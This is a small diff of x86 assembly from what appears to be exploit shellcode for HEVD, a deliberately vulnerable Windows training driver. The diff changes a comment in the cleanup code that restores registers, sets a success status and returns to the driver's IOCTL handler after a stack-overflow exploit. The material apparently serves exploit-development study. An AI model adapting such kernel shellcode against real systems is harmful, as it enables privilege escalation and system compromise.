@@ -23,6 +23,6 @@ _start:
     popad                       ; return to previous register state
 
     xor eax, eax            ; set NTSTATUS SUCCESS
-    mov ecx, eax            ; Copy 
-    mov eax, ecx
+    mov ecx, eax            ; zero out ecx (BufferOverflowStackIoctlHandler+0x1c) 
+    mov eax, ecx             
     ret                     ; return to HEVD!IrpDeviceIoCtlHandler
